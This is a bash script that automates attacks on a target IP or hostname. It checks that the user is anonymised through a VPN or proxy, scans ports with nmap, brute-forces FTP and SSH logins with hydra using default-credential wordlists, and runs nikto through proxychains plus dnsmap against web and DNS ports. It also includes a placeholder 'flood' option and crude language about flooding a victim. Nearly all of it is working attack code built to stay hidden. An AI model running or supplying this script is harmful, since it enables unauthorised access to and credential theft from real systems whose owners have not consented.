#!/bin/bash
FTP_WORDLIST="/usr/share/brutex/wordlists/ftp-default-userpass.txt"
SSH_WORDLIST="/usr/share/brutex/wordlists/ssh-default-userpass.txt"

#How many threads to use for bruteforce ##
THREADS="1"
scantodir_file="/some/dir/scanto.log"
getip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
#Attack programs
# Location of nikto prgram #
niktodir="/home/$USER/nikto-master/program/"  # Where is the nikto directory???? #
nikprog="nikto.pl"  # What have you named nikto ie instead of nikto.pl  it becomes web
#Whatever you name nikto  always chmod +x newnam  # 
#End nikto stuff

# DNSMAP #
dnsmapdir="/usr/bin/dnsmap"
dnsprog="dnsmap"
# END DNSMAP 
# How are you going to flood the bitch #
flood='some commands and locations on how you want to flood the user'
# If you have any MASTER wordlists you wanna use ##
#rainbowtbl="/somedir/someplace/somefile"
#wordlist="/somedir/someplace/somefile"

### END VARIABLES ###



# SCRIPT START #

# Is your network even secure? #

echo "Are you using network protection/anonymization Example;Direct to ISP or VPN/Proxy"

read -r -p "Are you anonymized? [y/N] " response     # If you chose yes show your ip and move on #
case "$response" in
    [yY][eE][sS]|[yY]) 
        echo " ${getip} is your ip"
        ;;
    *)  #If not secure,  exit script #
	echo "Ending script untill network/computer is secured"
       exit 0
        ;;
esac


# CHOSE YOUR ATTACK #

# IP attack  #

      echo "Enter IP address to attack.  You will be asked for hostname if the attack requires it"
        read -r ip 
        nmap -Pn $ip | grep open   # Get the ports from the ip  #


# Port attack selection #
read -r -p " Choose a port to attack " portresponse
  case "$portresponse" in 
  
	    21)
	echo "Time for an ftp attack.  Cracking against ip"
        	hydra -C $FTP_WORDLIST $ip ftp -t $THREADS -e ns
	echo " #### Cracking against hostname #### "
	read -r -p " Enter hostname without http/s://  " web
                hydra -C $FTP_WORDLIST $web ftp -t $THREADS -e ns
;;
       	    22)  # If you type 22 Do this attack else do another attack 
   	echo "Time for an ssh bruteforce"
	        hydra -C $SSH_WORDLIST $ip ssh -t $THREADS -e ns

;;
         flood)
	echo " Flood the bitch " 
	echo "${flood}"
;;
     80|443|53)
#	echo " Enter hostname "
	read -r -p " Enter Hostname :" web
		 /usr/bin/proxychains /usr/bin/perl $niktodir$nikprog -url $web
			echo " Initiating dnsmap "
			dnsmap $web
			
  ;;

	*)
		echo " Either no attack for selected port, or something went wrong "
;;
esac
